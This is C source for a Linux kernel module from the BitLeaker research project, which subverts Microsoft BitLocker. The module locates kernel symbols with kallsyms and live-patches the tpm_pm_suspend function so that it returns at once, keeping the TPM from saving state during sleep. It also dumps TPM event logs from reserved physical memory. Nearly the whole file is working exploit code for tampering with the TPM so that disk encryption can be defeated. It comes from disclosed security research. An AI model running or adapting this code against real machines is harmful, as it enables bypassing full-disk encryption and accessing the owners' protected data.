/**
 *                          BitLeaker
 *                        ------------
 *   Subverting Microsoft's BitLocker with One Vulnerability
 *
 *              Copyright (C) 2019 Seunghun Han
 *            at the Affiliated Institute of ETRI
 *     Project link: https://github.com/kkamagui/bitleaker
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <asm/text-patching.h>
#include <linux/kallsyms.h>

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("Seunghun Han"); 
MODULE_VERSION("1.0"); 
MODULE_DESCRIPTION("Bitleaker kernel module"); 

#define RESERVED_START	(0x80000)
#define RESERVED_SIZE	(64 * 1024)

typedef void *(*TEXT_POKE) (void *addr, const void *opcode, size_t len);

TEXT_POKE g_fn_text_poke;
// XOR RAX, RAX; RET
unsigned char g_ret_op_code[] = {0x48, 0x31, 0xc0, 0xc3};
unsigned char g_org_op_code[sizeof(g_ret_op_code)];
unsigned long g_tpm_suspend_addr;

/**
 * Show banner.
 */
void print_banner(void)
{
	printk(KERN_INFO "bitleaker:  ▄▄▄▄    ██▓▄▄▄█████▓ ██▓    ▓█████ ▄▄▄       ██ ▄█▀▓█████  ██▀███   \n"); printk(KERN_INFO "bitleaker: ▓█████▄ ▓██▒▓  ██▒ ▓▒▓██▒    ▓█   ▀▒████▄     ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒ \n");
	printk(KERN_INFO "bitleaker: ▒██▒ ▄██▒██▒▒ ▓██░ ▒░▒██░    ▒███  ▒██  ▀█▄  ▓███▄░ ▒███   ▓██ ░▄█ ▒ \n");
	printk(KERN_INFO "bitleaker: ▒██░█▀  ░██░░ ▓██▓ ░ ▒██░    ▒▓█  ▄░██▄▄▄▄██ ▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄   \n");
	printk(KERN_INFO "bitleaker: ░▓█  ▀█▓░██░  ▒██▒ ░ ░██████▒░▒████▒▓█   ▓██▒▒██▒ █▄░▒████▒░██▓ ▒██▒ \n");
	printk(KERN_INFO "bitleaker: ░▒▓███▀▒░▓    ▒ ░░   ░ ▒░▓  ░░░ ▒░ ░▒▒   ▓▒█░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░ \n");
	printk(KERN_INFO "bitleaker: ▒░▒   ░  ▒ ░    ░    ░ ░ ▒  ░ ░ ░  ░ ▒   ▒▒ ░░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░ \n");
	printk(KERN_INFO "bitleaker:  ░    ░  ▒ ░  ░        ░ ░      ░    ░   ▒   ░ ░░ ░    ░     ░░   ░  \n");
	printk(KERN_INFO "bitleaker:  ░       ░               ░  ░   ░  ░     ░  ░░  ░      ░  ░   ░      \n");
	printk(KERN_INFO "bitleaker:       ░                                                              \n");
	printk(KERN_INFO "bitleaker: \n");
	printk(KERN_INFO "bitleaker:        Made by Seunghun Han, https://kkamagui.github.io\n");
	printk(KERN_INFO "bitleaker: \n");
}

/**
 * Dump event logs.
 */ 
static int dump_event_logs(void)
{
	char* buffer;
	char* start_buffer;
	int i;

	buffer = (char*) ioremap_nocache(RESERVED_START, RESERVED_SIZE);
	printk(KERN_INFO"bitleaker: \n");
	printk(KERN_INFO"bitleaker: Dump event logs\n");
	printk(KERN_INFO"bitleaker: Virtual address %p physical address %p\n", (void*)buffer, (void*)RESERVED_START);
	if (buffer == NULL)
	{
		return -1;
	}

	start_buffer = buffer;
	for (i = 0 ; i < RESERVED_SIZE ; i++)
	{
		if (buffer[i] == '\n')
		{
			buffer[i] = '\0';
			printk(KERN_INFO"bitleaker: %s\n", start_buffer);
			start_buffer = buffer + i + 1;
		}
		else if (buffer[i] == '\0')
		{
			printk(KERN_INFO"bitleaker: == End of Data ==\n");
			break;
		}
	}

	iounmap(buffer);
	return 0;
}

/**
 * Initialize this module.
 */
static int __init bitleaker_init(void) 
{
	// Find functions
	g_fn_text_poke = (TEXT_POKE) kallsyms_lookup_name("text_poke");
	g_tpm_suspend_addr = kallsyms_lookup_name("tpm_pm_suspend");

	print_banner();

	printk(KERN_INFO "bitleaker: tpm_pm_suspend address is %lX\n", g_tpm_suspend_addr);
	printk(KERN_INFO "bitleaker: Original code of tpm_pm_suspend\n");
	print_hex_dump(KERN_INFO, "bitleaker: ", DUMP_PREFIX_ADDRESS,
		16, 1, (void*) g_tpm_suspend_addr, 16, 1);
	printk(KERN_INFO "bitleaker: \n");

	// Backup first byte of tpm_suspend_addr function and patch it to xor and ret.
	memcpy(g_org_op_code, (unsigned char*) g_tpm_suspend_addr, sizeof(g_org_op_code));
	g_fn_text_poke((void*) g_tpm_suspend_addr, g_ret_op_code, sizeof(g_ret_op_code));

	printk(KERN_INFO "bitleaker: Patched code of tpm_pm_suspend\n");
	print_hex_dump(KERN_INFO, "bitleaker: ", DUMP_PREFIX_ADDRESS,
		16, 1, (void*) g_tpm_suspend_addr, 16, 1);

	printk(KERN_INFO "bitleaker: Ready to sleep!\n");

	dump_event_logs();	
	return 0; 
} 

/**
 * Terminate this module.
 */
static void __exit bitleaker_exit(void) 
{ 
	printk(KERN_INFO "bitleaker: Recover code of tpm_pm_suspend\n");
	g_fn_text_poke((void*) g_tpm_suspend_addr, g_org_op_code, sizeof(g_org_op_code));
} 

module_init(bitleaker_init); 
module_exit(bitleaker_exit);
